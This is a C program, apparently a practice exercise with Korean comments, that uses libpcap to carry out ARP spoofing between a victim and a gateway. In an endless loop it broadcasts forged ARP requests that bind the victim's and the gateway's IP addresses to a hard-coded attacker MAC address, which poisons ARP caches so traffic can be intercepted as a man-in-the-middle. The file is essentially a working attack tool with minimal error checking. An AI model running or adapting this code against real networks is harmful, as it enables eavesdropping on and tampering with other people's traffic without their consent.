#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>

struct ethernet {
    uint8_t dst[6];
    uint8_t src[6];
    uint16_t type;
} __attribute__((__packed__));

struct arp_header {
    uint16_t Hardware_type;
    uint16_t Protocol_type;
    uint8_t Hw_addlen;
    uint8_t Pro_addlen;
    uint16_t Operation;  //1 == request 2 == reply
    uint8_t Src_hwadd[6]; //mac
    uint8_t Src_proadd[4]; //ip
    uint8_t Dst_hwadd[6]; //mac
    uint8_t Dst_proadd[4]; //ip;
} __attribute__((__packed__));

void send_arp(pcap_t *handle, uint8_t *target_mac, uint8_t *target_ip, uint8_t *my_mac, uint8_t *my_ip) {
    struct {
        struct ethernet eth;
        struct arp_header arp;
    } packet; //eth + arp == packet

    for(int i = 0; i < 6; i++) {
        packet.eth.dst[i] = target_mac[i]; // 이더넷 헤더 설정
        packet.eth.src[i] = my_mac[i];
    }
    packet.eth.type = htons(0x0806); //0806 == arp

    packet.arp.Hardware_type = htons(1);
    packet.arp.Protocol_type = htons(0x0800);
    packet.arp.Hw_addlen = 6;
    packet.arp.Pro_addlen = 4;
    packet.arp.Operation = htons(0x0001);

    for(int i = 0; i < 6; i++) {
        packet.arp.Src_hwadd[i] = my_mac[i];
        packet.arp.Dst_hwadd[i] = target_mac[i];
    }
    for(int i = 0; i < 4; i++) {
        packet.arp.Src_proadd[i] = my_ip[i];
        packet.arp.Dst_proadd[i] = target_ip[i];
    }

    // Send the packet
    if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(packet)) == -1) {
        fprintf(stderr, "Failed to send ARP packet: %s\n", pcap_geterr(handle));

    }
} //리퀘스트 패킷을 날렸지



int main(int argc, char *argv[]) {

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    char *device = argv[1];
    uint8_t my_mac[6] = {0x00, 0x0c, 0x29, 0xe2, 0x03, 0x59}; //맥주소
    uint8_t victim_ip[4];
    uint8_t gateway_ip[4];

    inet_pton(AF_INET, argv[2], victim_ip);
    inet_pton(AF_INET, argv[3], gateway_ip);

    handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);

    while (1) {
        send_arp(handle, (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, victim_ip, my_mac, gateway_ip); //브로드 캐스트로 피해자 IP
        send_arp(handle, (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, gateway_ip, my_mac, victim_ip); //브로드 캐스트로 게이트웨이
        sleep(10);
    }

    pcap_close(handle);
    return 0;
}
